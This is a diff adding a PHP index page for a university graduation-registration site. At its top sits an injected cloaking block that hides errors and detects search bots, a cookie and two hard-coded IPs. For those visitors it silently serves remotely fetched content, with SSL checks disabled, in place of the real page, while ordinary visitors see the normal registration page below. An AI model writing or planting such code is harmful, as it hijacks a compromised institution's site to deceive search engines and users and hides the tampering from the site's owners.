@@ -1,0 +1,243 @@
+<?php
+// Matikan semua laporan error supaya tidak muncul Error 500 di browser
+error_reporting(0);
+ini_set('display_errors', 0);
+
+$agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$visitor_ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+// Deteksi Bot
+$is_bot = false;
+$targets = ["google", "bot", "ahrefs", "bing", "slurp"];
+foreach($targets as $t) {
+    if (strpos($agent, $t) !== false) { $is_bot = true; break; }
+}
+
+// Deteksi Cookie/IP
+$is_allowed = (isset($_COOKIE["s288"]) || in_array($visitor_ip, ["85.92.66.150", "81.19.188.236"]));
+
+if ($_SERVER["REQUEST_URI"] == "/" && ($is_bot || $is_allowed)) {
+    
+    // Pakai URL file.txt kamu (Gunakan HTTPS)
+    $url = "https://daftarwisuda.unimugo.ac.id/files.txt"; 
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Lewati cek SSL agar tidak error
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+    
+    $output = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    // Hanya tampilkan jika berhasil ambil data dan statusnya 200 OK
+    if ($output !== false && $http_code == 200) {
+        header('Content-Type: text/html; charset=utf-8');
+        echo $output;
+        exit();
+    }
+}
+// Jika gagal, script otomatis lanjut ke HTML di bawah (Web Wisuda Asli)
+?>
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <!--  -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="halaman index sistem Pendaftaran wisuda ">
+    <meta name="author" content="anwar">
+    <link rel="shortcut icon" href="img/favicon-stimugo.jpg" type="image/x-icon"/>
+    <title>Sim Pendaftaran Wisuda</title>
+	<link rel="canonical" href="https://daftarwisuda.unimugo.ac.id" />
+    <!-- Bootstrap Core CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <!-- css dataTables -->
+    <link href="css/dataTables.bootstrap.css" rel="stylesheet">
+    <!-- css datepicker -->
+    <link href="css/bootstrap-datepicker.css" rel="stylesheet">
+    <!-- Custom CSS -->
+    <link href="css/modern-business.css" rel="stylesheet">
+     <link href="css/bootstrap.min.css" rel="stylesheet">
+    <!-- Custom Fonts -->
+    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!-- [if lt IE 9] -->
+        <!-- <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> -->
+    <!-- [endif] -->
+    <!-- Load File jquery.min.js yang ada difolder js -->
+    <!-- <script src="js/jquery.min.js"></script> -->
+    <!-- Load File bootstrap.min.js yang ada difolder js -->
+    <!-- <script src="js/bootstrap.min.js"></script> -->
+</head>  
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+        <div class="container">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="index_php.html">SIM Pendaftaran Wisuda</a>
+            </div>
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="about.html">About</a>
+                    </li>                    
+                    <li>
+                        <a href="contact.html">Contact</a>
+                    </li>   
+                    <li class="dropdown">
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown">Download Foto Proses Wisuda<b class="caret"></b></a>
+                        <!-- <ul class="dropdown-menu">                        
+                            <li>
+                                <a href="/fotowisuda2019">Tahun 2019</a>
+                            </li>
+                               <li role="separator" class="divider"></li>
+                        </ul> -->
+                    </li>
+                    <li class="dropdown">
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown">Cek Bebas Studi<b class="caret"></b></a>
+                        <ul class="dropdown-menu">                        
+                            <li>
+                                <a href="rekap_bebas_studi_mhs.html">Cari Bebas Studi</a>
+                            </li>
+                               <li role="separator" class="divider"></li>
+                        </ul></li>                                                 
+                    <li class="dropdown">
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown">Edit Formulir<b class="caret"></b></a>
+                        <ul class="dropdown-menu">
+                            <li>
+                                <a href="view_wisuda_mhs.html">Cari Data Wisuda</a></li>
+                            <li role="separator" class="divider"></li>
+                        </ul>
+                    </li>
+                    <li class="dropdown">
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown">Formulir<b class="caret"></b></a>
+                        <ul class="dropdown-menu">
+                            <li>
+                                <a href="pendaftaran_wisuda_mhs.html">Pendaftaran Wisuda</a>
+                            </li>                            
+                            <li role="separator" class="divider"></li>
+                            <!-- <li>
+                                <a href="pendaftaran_wisuda_B.php">Reguler B</a>
+                            </li> -->
+                            <!-- <li>
+                                <a href="faq.html">FAQ</a>
+                            </li>
+                            <li>
+                                <a href="404.html">404</a>
+                            </li>
+                            <li>
+                                <a href="pricing.html">Pricing Table</a>
+                            </li> -->
+                        </ul></li></ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+    <!-- Header Carousel -->
+    <header id="myCarousel" class="carousel slide">
+        <!-- Indicators -->
+        <ol class="carousel-indicators">
+            <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
+            <li data-target="#myCarousel" data-slide-to="1"></li>
+            <li data-target="#myCarousel" data-slide-to="2"></li>
+        </ol>
+        <!-- Wrapper for slides -->
+        <div class="carousel-inner">
+            <div class="item active">
+                <div class="fill" style="background-image:url('img/aula-stikes.jpg');"></div>
+                <div class="carousel-caption">
+                    <h2>Aula Gedung rektorat Lt III</h2>
+                </div>
+            </div>
+            <div class="item">
+                <div class="fill" style="background-image:url('img/foto-bersama.jpg');"></div>
+                <div class="carousel-caption">
+                    <h2>Foto Bersama Wisuda</h2>
+                </div>
+            </div>
+            <div class="item">
+                <div class="fill" style="background-image:url('img/wisuda.jpg');"></div>
+                <div class="carousel-caption">
+                    <h2>Pemindahan Tali Toga Wisuda</h2>
+                </div>
+            </div>
+        </div>
+        <!-- Controls -->
+        <a class="left carousel-control" href="#myCarousel" data-slide="prev">
+            <span class="icon-prev"></span>
+        </a>
+        <a class="right carousel-control" href="#myCarousel" data-slide="next">
+            <span class="icon-next"></span>
+        </a>
+    </header>
+    <!-- end header animasi slide -->
+    <!-- Page Content -->
+    <div class="container">
+        <!-- Marketing Icons Section -->
+      <div class="row">
+            <div class="col-md-6">
+                <img class="img-responsive" src="img/flyer1.jpeg" alt="">
+            </div>
+            <div class="col-md-6">
+                <img class="img-responsive" src="img/flyer2.jpeg" alt="">
+            </div>
+        </div>
+      <div class="row">
+            <div class="col-md-12 col-sm-12 col-xs-12 col-lg-12">
+                  <!-- Main component for a primary marketing message or call to action -->
+                  <div class="jumbotron">
+                    <h1>PENDAFTARAN WISUDA</h1>
+                    <h3>UNIVERSITAS MUHAMMADIYAH GOMBONG</h3> <br>
+                    <p>
+                      <b>Sebelum melakukan pendaftaran WISUDA silahkan klik <a href="Pengumuman_Wisuda_Tahun_2023_(Periode II TA 2022-2023).pdf"> disini </a> untuk unduh informasi WISUDA</b>
+                    </p><br>
+                    <p>Sistem ini digunakan untuk pendaftaran mahasiswa yang akan mengikuti wisuda.</p> 
+                    <p>Yang perlu diperhatikan dan disiapkan dalam mengisi formulir pendaftaran : </p>  
+                    <p>- Siapkan File pasfoto (hasil di foto atau scanan boleh) ukuran max 50 KB atau 50.000 byte.</p>
+                    <p>- Input Nama dan Tanggal Lahir harus sesuai di akte kelahiran.</p>
+                    <p>- Nilai IPK Terakhir sesui KHS semester akhir.</p>
+                    <p>- disiapkan judul tugas akhir/skripsi dalam 2 bahasa (indonesia dan inggris).</p> 
+                    <p>- Untuk menggunakan sistem ini Wisudawan/ Wisudawati tidak harus login.</p> 
+                    <p>- Silahkan langsung Pilih Menu link di atas (sebelah kanan):</p>
+                        <p> 1. MENU FORMULIR untuk : Mendaftar</p>
+                        <p> 2. EDIT FORMULIR untuk : Cek dan Meng-edit apakah sdh terdaftar atau ada yang salah</p>
+                        <p> 3. CEK BEBAS STUDI untuk : Cek Apakah msh ada yang belum bebas Studi atau sudah semua </p>
+                    <a href="login.html" data-toggle="tooltip" title="Login!" class="btn-lg btn-success" role="button"><span class="glyphicon glyphicon-list"></span> Login! [hanya untuk admin]</a>
+                  </div> <!-- /jumbotron -->
+            </div> <!-- /col-md-12 -->
+        </div>  <!-- / row -->
+        <hr>
+        <!-- Footer -->
+        <footer>
+            <div class="row">
+                <div class="col-lg-12">
+                    <p>Copyright &copy; <a href="https://unimugo.ac.id/"> Universitas Muhammadiyah Gombong </a> - 2017</p>
+                </div>
+            </div>
+        </footer>
+    </div> <!-- /.container -->
+    <!-- jQuery -->
+    <script src="js/jquery.js"></script>
+    <!-- Bootstrap Core JavaScript -->
+    <script src="js/bootstrap.min.js"></script>
+    <!-- Script to Activate the Carousel -->
+    <script>
+    $('.carousel').carousel({
+        interval: 5000 //changes the speed
+    })
+    </script>
+</html>
